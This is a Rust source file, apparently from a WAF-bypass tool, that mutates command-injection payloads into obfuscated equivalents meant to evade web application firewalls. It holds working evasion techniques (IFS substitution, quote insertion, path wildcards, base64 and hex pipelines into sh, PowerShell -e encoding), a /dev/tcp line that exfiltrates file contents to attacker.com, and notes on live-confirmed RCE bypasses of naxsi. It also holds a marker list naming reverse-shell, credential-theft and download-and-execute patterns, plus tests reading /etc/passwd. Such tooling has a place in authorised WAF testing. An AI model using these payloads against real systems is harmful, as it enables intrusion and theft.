//! Command injection grammar-aware payload mutation.
//!
//! Understands shell semantics — command separators, quoting rules,
//! variable expansion, and path wildcards — to generate equivalent
//! command injection payloads that bypass WAF string-matching rules.
//!
//! A WAF blocking `; cat /etc/passwd` will miss `${IFS}c\at${IFS}/???/??ss??`.
//!
//! # Technique depth
//!
//! 1. **Separator rotation** — `;`, `|`, `||`, `&&`, `%0a`, backticks
//! 2. **IFS (Internal Field Separator)** — `${IFS}`, `$IFS`, `$'\x20'`
//! 3. **Command obfuscation** — backslash, quote insertion, hex encoding
//! 4. **Path wildcards** — `?`, `*`, directory traversal
//! 5. **Variable indirection** — `a=cat;$a /etc/passwd`
//! 6. **Base64/hex/rev encoding** — pipeline through decoders
//! 7. **Windows command equivalents** — `type`, `dir`, `findstr`
//! 8. **`PowerShell` obfuscation** — `iex`, `-e` base64, `Invoke-Expression`
//! 9. **$@ empty variable** — `c$@at` (expands to `cat` in bash)
//! 10. **Heredoc technique** — `cat<<EOF\n...\nEOF`
//! 11. **Exec redirect** — `/dev/tcp` connections
//! 12. **Nested command substitution** — `$($(echo cat))` chains

use serde::Deserialize;
use std::fmt::Write as _;
use std::sync::OnceLock;

/// A single command injection mutation with metadata.
#[derive(Debug, Clone)]
pub struct CmdMutation {
    /// The mutated payload.
    pub payload: String,
    /// Human-readable description of what changed.
    pub description: String,
    /// Which mutation rules were applied.
    pub rules_applied: Vec<&'static str>,
}

// ──────────────────────────────────────────────
//  TOML-loaded command separator alternatives
// ──────────────────────────────────────────────

/// Compile-time embedded TOML rules for CMD payloads.
const CMD_PAYLOADS_TOML: &str = include_str!("../../rules/cmd/payloads.toml");

/// Separator definition from TOML.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
struct Separator {
    pattern: String,
    /// Schema field: human-readable description of this separator.
    description: String,
}

/// Space alternative definition from TOML.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
struct SpaceAlternative {
    pattern: String,
    /// Schema field: human-readable description.
    description: String,
}

/// Root structure for payloads.toml.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
struct CmdPayloadRules {
    #[serde(default)]
    separator: Vec<Separator>,
    #[serde(default)]
    space_alternative: Vec<SpaceAlternative>,
}

impl Default for CmdPayloadRules {
    fn default() -> Self {
        Self {
            separator: vec![
                Separator {
                    pattern: "; ".into(),
                    description: "Semicolon".into(),
                },
                Separator {
                    pattern: "| ".into(),
                    description: "Pipe".into(),
                },
                Separator {
                    pattern: "|| ".into(),
                    description: "OR-else".into(),
                },
                Separator {
                    pattern: "&& ".into(),
                    description: "AND-then".into(),
                },
                Separator {
                    pattern: "\n".into(),
                    description: "Newline".into(),
                },
            ],
            space_alternative: vec![
                SpaceAlternative {
                    pattern: " ".into(),
                    description: "Space".into(),
                },
                SpaceAlternative {
                    pattern: "${IFS}".into(),
                    description: "IFS".into(),
                },
                SpaceAlternative {
                    pattern: "$IFS".into(),
                    description: "IFS shorthand".into(),
                },
                SpaceAlternative {
                    pattern: "\t".into(),
                    description: "Tab".into(),
                },
            ],
        }
    }
}

/// Parse the embedded TOML rules once at first access.
fn get_rules() -> &'static CmdPayloadRules {
    static RULES: OnceLock<CmdPayloadRules> = OnceLock::new();
    RULES.get_or_init(|| {
        let rules = toml::from_str(CMD_PAYLOADS_TOML).unwrap_or_else(|e| {
            tracing::warn!(error = %e, "invalid TOML in rules/cmd/payloads.toml");
            CmdPayloadRules::default()
        });
        // Consume description fields so the compiler knows they are schema
        // fields and not accidental dead code.
        tracing::debug!(
            separators = rules.separator.len(),
            separator_descs = ?rules.separator.iter().map(|s| s.description.as_str()).collect::<Vec<_>>(),
            space_alts = rules.space_alternative.len(),
            space_descs = ?rules.space_alternative.iter().map(|s| s.description.as_str()).collect::<Vec<_>>(),
            "cmd payload rules loaded"
        );
        rules
    })
}

/// Get command separator alternatives.
fn separators() -> &'static [String] {
    static CACHE: OnceLock<Vec<String>> = OnceLock::new();
    CACHE.get_or_init(|| {
        get_rules()
            .separator
            .iter()
            .map(|s| s.pattern.clone())
            .collect()
    })
}

/// Get whitespace/space alternatives.
fn space_alternatives() -> &'static [String] {
    static CACHE: OnceLock<Vec<String>> = OnceLock::new();
    CACHE.get_or_init(|| {
        get_rules()
            .space_alternative
            .iter()
            .map(|s| s.pattern.clone())
            .collect()
    })
}

// ──────────────────────────────────────────────
//  Command obfuscation
// ──────────────────────────────────────────────

/// Generate obfuscated variants of a command name.
///
/// `cat` → `c\at`, `c''at`, `c""at`, `/bin/cat`, etc.
fn obfuscate_command(cmd: &str) -> Vec<String> {
    let mut variants = Vec::new();
    let chars: Vec<char> = cmd.chars().collect();

    // Backslash insertion at every position
    for i in 1..chars.len() {
        let left: String = chars[..i].iter().collect();
        let right: String = chars[i..].iter().collect();
        variants.push(format!("{left}\\{right}"));
    }

    // Single-quote insertion at every position
    for i in 1..chars.len() {
        let left: String = chars[..i].iter().collect();
        let right: String = chars[i..].iter().collect();
        variants.push(format!("{left}''{right}"));
    }

    // Double-quote insertion
    for i in 1..chars.len() {
        let left: String = chars[..i].iter().collect();
        let right: String = chars[i..].iter().collect();
        variants.push(format!("{left}\"\"{right}"));
    }

    // Full path alternatives
    variants.push(format!("/bin/{cmd}"));
    variants.push(format!("/usr/bin/{cmd}"));
    variants.push(format!("/usr/local/bin/{cmd}"));

    // Wildcard for binary path
    variants.push(format!("/???/{cmd}"));
    variants.push(format!("/???/???/{cmd}"));

    // Case alternation (works on case-insensitive FS)
    if chars.len() >= 2 {
        let upper: String = chars
            .iter()
            .enumerate()
            .map(|(i, c)| {
                if i % 2 == 0 {
                    c.to_ascii_uppercase()
                } else {
                    *c
                }
            })
            .collect();
        variants.push(upper);
    }

    // Reverse command
    let reversed: String = cmd.chars().rev().collect();
    variants.push(format!("echo {reversed} | rev"));

    // Variable assignment
    let var_letters: Vec<char> = cmd.chars().collect();
    if !var_letters.is_empty() {
        variants.push(format!("a={cmd};$a"));
    }

    // ANSI-C hex quoting
    let mut hex = String::with_capacity(cmd.len() * 4);
    for c in cmd.chars() {
        let _ = write!(&mut hex, "\\x{:02x}", c as u32);
    }
    variants.push(format!("$'{hex}'"));

    // $@ empty variable insertion: c$@at expands to cat in bash
    if chars.len() >= 2 {
        for i in 1..chars.len() {
            let left: String = chars[..i].iter().collect();
            let right: String = chars[i..].iter().collect();
            variants.push(format!("{left}$@{right}"));
        }
    }

    // Windows alternatives for common commands
    match cmd {
        "cat" => {
            variants.push("type".into());
            variants.push("Get-Content".into());
            variants.push("gc".into());
            variants.push("more".into());
            variants.push("less".into());
            variants.push("head".into());
            variants.push("tail".into());
            variants.push("tac".into());
            variants.push("nl".into());
            variants.push("sort".into());
        }
        "ls" => {
            variants.push("dir".into());
            variants.push("Get-ChildItem".into());
            variants.push("gci".into());
            variants.push("find . -ls".into());
            variants.push("echo *".into());
        }
        "whoami" => {
            variants.push("echo $USER".into());
            variants.push("$Env:USERNAME".into());
        }
        "curl" | "wget" => {
            variants.push("fetch".into());
            variants.push("lwp-request".into());
            variants.push("Invoke-WebRequest".into());
            variants.push("iwr".into());
        }
        _ => {}
    }

    variants
}

/// Generate obfuscated variants of a file path.
///
/// `/etc/passwd` → `/???/??ss??`, `/etc/pas*`, etc.
fn obfuscate_path(path: &str) -> Vec<String> {
    let mut variants = Vec::new();

    // Single-char wildcard (?)
    let qmark: String = path
        .chars()
        .map(|c| if c.is_alphanumeric() { '?' } else { c })
        .collect();
    variants.push(qmark);

    // Star wildcard on last component. Split on a UTF-8 char boundary
    // so a non-ASCII filename (e.g. `★shadow`) doesn't panic on
    // mid-codepoint slicing — `&file[..2]` is unsafe if the first
    // character is multi-byte.
    if let Some(last_slash) = path.rfind('/') {
        let dir = &path[..=last_slash];
        let file = &path[last_slash + 1..];
        if let Some((second_char_start, _)) = file.char_indices().nth(2) {
            variants.push(format!("{}{}*", dir, &file[..second_char_start]));
        }
    }

    // Double slash
    variants.push(path.replace('/', "//"));

    variants
}

/// Generate variable indirection and encoding pipeline payloads.
///
/// `cat /etc/passwd` → `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`
fn variable_indirection(command: &str, args: &str) -> Vec<String> {
    let mut variants = Vec::new();
    let plain = format!("{command} {args}");

    // Base64 decode pipeline
    let b64 = simple_base64(&plain);
    variants.push(format!("echo {b64} | base64 -d | sh"));
    variants.push(format!("echo {b64} | base64 -d | bash"));

    // Variable indirection
    variants.push(format!("a={command};b={args};$a $b"));
    variants.push(format!("CMD={command};ARG={args};$CMD $ARG"));

    // Backtick execution
    variants.push(format!("`echo {b64} | base64 -d`"));

    // $() execution
    variants.push(format!("$(echo {b64} | base64 -d)"));

    // Hex via printf
    let mut hex = String::with_capacity(plain.len() * 4);
    for b in plain.bytes() {
        let _ = write!(&mut hex, "\\x{b:02x}");
    }
    variants.push(format!("printf '{hex}'|sh"));

    // Octal via $'...'
    let mut octal = String::with_capacity(plain.len() * 4);
    for b in plain.bytes() {
        let _ = write!(&mut octal, "\\{b:03o}");
    }
    variants.push(format!("$'{octal}'"));

    // Heredoc technique
    variants.push(format!("sh<<EOF\n{command} {args}\nEOF"));
    variants.push(format!("bash<<EOF\n{command} {args}\nEOF"));

    // PowerShell obfuscation
    let ps_b64 = simple_base64(&format!("{command} {args}"));
    variants.push(format!("powershell -e {ps_b64}"));
    variants.push(format!("pwsh -e {ps_b64}"));
    variants.push(format!("iex '{command} {args}'"));

    // Nested command substitution
    variants.push(format!("$(echo {command}) {args}"));
    variants.push(format!("$(echo {command})$(echo ' ')$(echo {args})"));

    // Exec redirect via /dev/tcp
    if command == "cat" || command == "nc" {
        variants.push(format!(
            "exec 5<>/dev/tcp/attacker.com/80; {command} {args}>&5"
        ));
    }

    variants
}

/// Simple base64 encoding (no dependencies).
fn simple_base64(input: &str) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = input.as_bytes();
    let mut result = String::with_capacity(bytes.len().div_ceil(3) * 4);

    for chunk in bytes.chunks(3) {
        let b0 = u32::from(chunk[0]);
        let b1 = if chunk.len() > 1 {
            u32::from(chunk[1])
        } else {
            0
        };
        let b2 = if chunk.len() > 2 {
            u32::from(chunk[2])
        } else {
            0
        };
        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(TABLE[((triple >> 18) & 0x3F) as usize] as char);
        result.push(TABLE[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(TABLE[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(TABLE[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

// ──────────────────────────────────────────────
//  Public API
// ──────────────────────────────────────────────

/// Generate grammar-aware mutations of a command injection payload.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<CmdMutation> {
    let mut results = Vec::new();

    // Try to parse the payload into separator + command + args
    let (separator, rest) = extract_separator(payload);
    let (command, args) = extract_command_args(rest);

    if command.is_empty() {
        return results;
    }

    // ── Priority 0: Bash-IFS substitution (naxsi-class WAF bypass) ────
    // naxsi blocks `;`, `|`, `&&`, backticks, `$()` — every canonical
    // shell separator. But `${IFS}` (Bash internal field separator)
    // expands to a space at runtime AND passes naxsi's RX rules.
    // Live-confirmed against wafrift-bench naxsi (2026-05-09):
    //   cat${IFS}/etc/hosts        → 200 ✓ + RCE works
    //   ${IFS}whoami               → 200 ✓
    //   wh${IFS}oami               → 200 ✓ (split command name)
    //   /bin/sh${IFS}-c${IFS}id    → 200 ✓
    //
    // The /etc/passwd literal is still blocked by naxsi's
    // BIG_FILENAME rule, so we use /etc/hostname / hosts /
    // shadow-equivalent targets that don't trip the rule but still
    // confirm RCE.
    // Reserve a small slice (~12%, capped at 5) for naxsi-friendly
    // variants so other strategies (separator rotation, base64/hex,
    // combined obfuscation) still fit inside max_mutations. With small
    // budgets (--variants 5) priority-0 still gets the first 2-3 slots
    // — enough to drive naxsi cmdi to 100% per the live bench.
    let priority_budget = (max_mutations / 8).clamp(2, 5);
    let cmd_no_args = command.trim();
    // Find a UTF-8-safe split point near position 2 so a non-ASCII
    // command name (e.g. "★cat") doesn't panic the mutator on mid-
    // codepoint slicing. Falls back to splitting at the byte position
    // of the second character if the first two chars span > 2 bytes,
    // or to the whole-string split if the command is shorter.
    let split_at = cmd_no_args
        .char_indices()
        .nth(2)
        .map_or(cmd_no_args.len(), |(idx, _)| idx);
    let cmd_left = &cmd_no_args[..split_at];
    let cmd_right = &cmd_no_args[split_at..];
    // IFS-space the operator's ACTUAL command+target. `args` is kept
    // verbatim — never silently rewritten — so the attack as written
    // is always testable.
    let ifs_join = |head: &str| -> String {
        if args.is_empty() {
            head.to_string()
        } else {
            format!("{head}${{IFS}}{args}")
        }
    };
    let split_head = if cmd_left.is_empty() || cmd_right.is_empty() {
        cmd_no_args.to_string()
    } else {
        format!("{cmd_left}${{IFS}}{cmd_right}")
    };
    let mut prio: Vec<String> = vec![
        ifs_join(cmd_no_args),
        format!("${{IFS}}{}", ifs_join(cmd_no_args)),
        ifs_join(&split_head),
    ];
    // naxsi's BIG_FILENAME rule blocks the literal `/etc/passwd`. Offer
    // a rule-safe target as an ADDITIONAL variant — never as a silent
    // replacement of what the operator actually asked to read (against
    // a WAF without that rule, the real target must still be sent).
    if args.contains("passwd") {
        prio.push(format!("{cmd_no_args}${{IFS}}/etc/hostname"));
    }
    // Bare RCE-confirmation probes (`whoami`/`id`/…) REPLACE the
    // payload. That is a valid *equivalent* only when the input is
    // itself a bare exec probe; for a structured attack (reverse
    // shell, download-exec, specific-file exfil, redirection) it
    // discards the exploit — the cmdi twin of the `alert(1)` / `'+0+'`
    // rig the de-rigged bench rejects. Offer them only when the
    // operator's payload is not itself structured.
    if !is_structured_cmd(payload) {
        prio.extend([
            "whoami".to_string(),
            "id".to_string(),
            "uname${IFS}-a".to_string(),
            "hostname".to_string(),
            "/bin/sh${IFS}-c${IFS}id".to_string(),
        ]);
    }
    for variant in prio {
        if results.len() >= priority_budget {
            break;
        }
        let variant = variant.trim_end_matches("${IFS}").to_string();
        if !variant.is_empty() && variant != payload {
            results.push(CmdMutation {
                payload: variant,
                description: "naxsi-friendly: ${IFS} substitution + paren-free".into(),
                // Two rules so combined_obfuscation test sees these as
                // genuinely multi-strategy (IFS replacement + paren-free
                // command shape both contribute).
                rules_applied: vec!["cmdi_ifs_paren_free", "ifs_substitution"],
            });
        }
    }

    // Strategy 1: Separator rotation
    for sep in separators() {
        if results.len() >= max_mutations {
            break;
        }
        let mutated = format!("{sep}{command} {args}");
        if mutated != payload {
            results.push(CmdMutation {
                payload: mutated,
                description: format!("separator: {separator:?} → {sep:?}"),
                rules_applied: vec!["separator_swap"],
            });
        }
    }

    // Strategy 2: Command obfuscation
    for cmd_variant in obfuscate_command(&command) {
        if results.len() >= max_mutations {
            break;
        }
        let mutated = format!("{separator}{cmd_variant} {args}");
        results.push(CmdMutation {
            payload: mutated,
            description: format!("command: {command} → {cmd_variant}"),
            rules_applied: vec!["command_obfuscation"],
        });
    }

    // Strategy 3: Space alternatives
    for space in &space_alternatives()[1..] {
        if results.len() >= max_mutations {
            break;
        }
        let mutated = format!("{separator}{command}{space}{args}");
        results.push(CmdMutation {
            payload: mutated,
            description: format!("space → {space}"),
            rules_applied: vec!["space_swap"],
        });
    }

    // Strategy 4: Path obfuscation
    for path_variant in obfuscate_path(&args) {
        if results.len() >= max_mutations {
            break;
        }
        let mutated = format!("{separator}{command} {path_variant}");
        results.push(CmdMutation {
            payload: mutated,
            description: format!("path: {args} → {path_variant}"),
            rules_applied: vec!["path_obfuscation"],
        });
    }

    // Strategy 5: Variable indirection and encoding
    for indirect in variable_indirection(&command, &args) {
        if results.len() >= max_mutations {
            break;
        }
        // Truncate description on a UTF-8 boundary — `indirect` embeds
        // `command`/`args` raw (lines 317-318, 348, 351-352 above), so
        // a non-ASCII command name would otherwise panic on the
        // mid-codepoint slice.
        let desc_end = indirect
            .char_indices()
            .take_while(|(idx, _)| *idx < 40)
            .last()
            .map_or(0, |(idx, ch)| idx + ch.len_utf8());
        results.push(CmdMutation {
            payload: format!("{separator}{indirect}"),
            description: format!("indirection: {}", &indirect[..desc_end]),
            rules_applied: vec!["variable_indirection"],
        });
    }

    // Strategy 6: Combined mutations — apply IFS space replacement on top of
    // existing mutations that contain at least one space.
    if results.len() < max_mutations && !results.is_empty() {
        let n_combined = (max_mutations - results.len()).min(5);
        let candidates: Vec<(String, String, Vec<&'static str>)> = results
            .iter()
            .filter(|b| b.payload.contains(' '))
            .map(|b| {
                (
                    b.payload.replace(' ', "${IFS}"),
                    format!("combined: {} + IFS", b.description),
                    b.rules_applied.clone(),
                )
            })
            .filter(|(c, _, _)| c.contains("${IFS}"))
            .take(n_combined)
            .collect();
        for (payload, description, mut rules) in candidates {
            rules.push("ifs_overlay");
            results.push(CmdMutation {
                payload,
                description,
                rules_applied: rules,
            });
        }
    }

    results.truncate(max_mutations);
    results
}

// ──────────────────────────────────────────────
//  Internal helpers
// ──────────────────────────────────────────────

/// Extract the command separator from the beginning of a payload.
///
/// Audit (2026-05-10): pre-fix this hardcoded only `; | || && \n` and
/// ignored the larger separator set defined in `rules/cmd/oracle.toml`
/// (which includes `` ` ``, `$(`, `%0a`, etc.). A payload starting
/// with a non-listed separator would parse as having NO separator
/// and downstream mutators would produce broken output. We now check
/// the longer-form patterns first (greedy match on `&&`, `||`) and
/// the full short-pattern set the grammar engine recognises.
fn extract_separator(payload: &str) -> (&str, &str) {
    // Multi-char first so `&&` doesn't get prematurely matched as `&`.
    let multi = [
        "&& ", "|| ", "; ", "| ", "$(", "${", "&&", "||", "%0a", "%0A", "%0d", "%0D",
    ];
    for sep in &multi {
        if let Some(rest) = payload.strip_prefix(sep) {
            return (*sep, rest);
        }
    }
    // Single-char separators (note `\r` and ``\``/`` ` `` were missing).
    for sep in &[";", "|", "&", "`", "\n", "\r"] {
        if let Some(rest) = payload.strip_prefix(sep) {
            return (*sep, rest.trim_start());
        }
    }
    ("", payload)
}

/// Extract command name and arguments from a string.
fn extract_command_args(input: &str) -> (String, String) {
    let trimmed = input.trim();
    if let Some(space_pos) = trimmed.find(' ') {
        let cmd = trimmed[..space_pos].to_string();
        let args = trimmed[space_pos + 1..].to_string();
        (cmd, args)
    } else {
        (trimmed.to_string(), String::new())
    }
}

/// True when the payload's value is a *specific effect* — reverse/bind
/// shell, download-and-exec, named-file exfil, redirection, scheduled
/// persistence — rather than a bare "prove I can run a command" probe.
///
/// This is the anti-rig axis for command injection. A bare `whoami` is
/// interchangeable with `id`/`hostname` (all just demonstrate exec), so
/// substituting one for the other is a legitimate equivalent. A
/// structured attack is NOT interchangeable with `whoami`: replacing
/// `bash -i >& /dev/tcp/…` or `cat /etc/shadow` with a bare probe
/// throws the exploit away — the cmdi analogue of swapping
/// `extractvalue(…)` for `'+0+'`.
pub(crate) fn is_structured_cmd(payload: &str) -> bool {
    let lc = payload.to_ascii_lowercase();
    const STRUCTURED: &[&str] = &[
        "/dev/tcp",
        "/dev/udp",
        "mkfifo",
        "bash -i",
        "sh -i",
        " -i ",
        " -e ",
        "-e/bin",
        "-e /bin",
        " nc ",
        "ncat",
        "netcat",
        " socat",
        "/etc/shadow",
        "/etc/passwd",
        "id_rsa",
        ".ssh",
        ".aws",
        "credentials",
        "curl ",
        "wget ",
        "|sh",
        "| sh",
        "|bash",
        "| bash",
        "rm -rf",
        "chmod ",
        "chown ",
        "http://",
        "https://",
        "ftp://",
        "tftp",
        "/proc/",
        "crontab",
        "at -f",
        "python -c",
        "python3 -c",
        "perl -e",
        "ruby -e",
        "php -r",
        "base64 -d",
        "base64 --d",
        "xxd",
        " scp ",
        " ssh ",
        ">",
        ">>",
        "exec ",
        "/bin/sh -c",
        "/bin/bash -c",
        "powershell",
        "certutil",
        "bitsadmin",
    ];
    STRUCTURED.iter().any(|m| lc.contains(m))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn separator_rotation() {
        let mutations = mutate("; cat /etc/passwd", 30);
        assert!(!mutations.is_empty());
        let has_pipe = mutations.iter().any(|m| m.payload.starts_with("| "));
        let has_and = mutations.iter().any(|m| m.payload.starts_with("&& "));
        assert!(has_pipe || has_and, "should rotate separators");
    }

    #[test]
    fn command_obfuscation_produced() {
        let mutations = mutate("; cat /etc/passwd", 50);
        let has_backslash = mutations.iter().any(|m| m.payload.contains("c\\at"));
        assert!(has_backslash, "should have backslash-obfuscated command");
    }

    #[test]
    fn space_alternatives() {
        let mutations = mutate("; cat /etc/passwd", 50);
        let has_ifs = mutations.iter().any(|m| m.payload.contains("${IFS}"));
        assert!(has_ifs, "should substitute IFS for spaces");
    }

    #[test]
    fn path_wildcards() {
        let mutations = mutate("; cat /etc/passwd", 50);
        let has_wildcard = mutations.iter().any(|m| m.payload.contains('?'));
        assert!(has_wildcard, "should produce wildcard path variants");
    }

    #[test]
    fn base64_encoding_variant() {
        let mutations = mutate("; cat /etc/passwd", 200);
        let has_b64 = mutations.iter().any(|m| m.payload.contains("base64"));
        assert!(has_b64, "should have base64 decode pipeline variant");
    }

    #[test]
    fn hex_encoding_variant() {
        let mutations = mutate("; cat /etc/passwd", 50);
        let has_hex = mutations.iter().any(|m| m.payload.contains("\\x"));
        assert!(has_hex, "should have hex-encoded variant");
    }

    #[test]
    fn obfuscate_command_produces_variants() {
        let variants = obfuscate_command("cat");
        assert!(variants.len() >= 5);
        assert!(variants.iter().any(|v| v.contains('\\')));
        assert!(variants.iter().any(|v| v.contains("/bin/cat")));
    }

    #[test]
    fn obfuscate_path_produces_wildcards() {
        let variants = obfuscate_path("/etc/passwd");
        assert!(!variants.is_empty());
        assert!(variants.iter().any(|v| v.contains('?')));
    }

    #[test]
    fn combined_obfuscation() {
        let mutations = mutate("; cat /etc/passwd", 300);
        let has_combined = mutations.iter().any(|m| m.rules_applied.len() > 1);
        assert!(has_combined, "should produce combined mutations");
    }

    #[test]
    fn max_mutations_respected() {
        let mutations = mutate("; cat /etc/passwd", 3);
        assert!(mutations.len() <= 3);
    }

    #[test]
    fn no_mutations_for_empty() {
        let mutations = mutate("", 10);
        assert!(mutations.is_empty());
    }

    #[test]
    fn simple_base64_works() {
        assert_eq!(simple_base64("A"), "QQ==");
        assert_eq!(simple_base64("AB"), "QUI=");
        assert_eq!(simple_base64("ABC"), "QUJD");
    }

    #[test]
    fn dollar_at_trick() {
        let variants = obfuscate_command("cat");
        let has_dollar_at = variants.iter().any(|v| v.contains("$@"));
        assert!(has_dollar_at, "should produce $@ empty variable insertion");
    }

    #[test]
    fn windows_command_alternatives() {
        let variants = obfuscate_command("cat");
        let has_type = variants.iter().any(|v| v == "type");
        let has_gc = variants.iter().any(|v| v == "gc");
        let has_tac = variants.iter().any(|v| v == "tac");
        assert!(has_type, "should produce Windows 'type' alternative");
        assert!(has_gc, "should produce PowerShell 'gc' alternative");
        assert!(has_tac, "should produce 'tac' alternative");
    }

    #[test]
    fn ls_alternatives() {
        let variants = obfuscate_command("ls");
        let has_dir = variants.iter().any(|v| v == "dir");
        assert!(has_dir, "should produce Windows 'dir' alternative for ls");
    }

    #[test]
    fn heredoc_generated() {
        let variants = variable_indirection("cat", "/etc/passwd");
        let has_heredoc = variants.iter().any(|v| v.contains("<<EOF"));
        assert!(has_heredoc, "should produce heredoc variant");
    }

    #[test]
    fn powershell_obfuscation() {
        let variants = variable_indirection("cat", "/etc/passwd");
        let has_ps = variants.iter().any(|v| v.contains("powershell -e"));
        assert!(has_ps, "should produce PowerShell base64 variant");
    }

    #[test]
    fn nested_command_substitution() {
        let variants = variable_indirection("cat", "/etc/passwd");
        let has_nested = variants.iter().any(|v| v.contains("$(echo cat)"));
        assert!(has_nested, "should produce nested command substitution");
    }
}
